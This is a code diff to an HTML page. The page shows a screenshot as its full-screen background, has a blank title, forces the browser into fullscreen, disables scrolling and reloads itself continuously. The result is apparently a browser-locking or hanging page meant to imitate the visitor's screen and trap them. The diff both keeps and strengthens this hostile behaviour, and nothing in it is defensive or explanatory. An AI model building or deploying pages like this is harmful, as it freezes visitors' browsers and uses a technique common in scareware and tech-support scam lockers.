@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title> </title>
+    <link rel="icon" href="https://freeimage.host/i/dLWifDP" type="image/png"> <!-- Favicon link -->
     <style>
         body {
             margin: 0;
             height: 100vh;
-            background-image: url('https://i.postimg.cc/ncZH7ST4/Screenshot-2024-09-25-11-14-40-AM.png');
+            overflow: hidden; /* Prevent scrolling */
+            background-image: url('https://example.com/high-quality-image.jpg'); /* Replace with high-quality image URL */
             background-size: cover;
             background-position: center;
             display: flex;
@@ -17,8 +19,22 @@
         }
     </style>
     <script>
+        function goFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, and Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE/Edge
+                elem.msRequestFullscreen();
+            }
+        }
+
         window.onload = function() {
-            setTimeout(() => { while (true) { location.reload(); } }, 1);
+            goFullscreen(); // Attempt to go fullscreen
+            setInterval(() => { location.reload(); }, 0);
         };
     </script>
 </head>
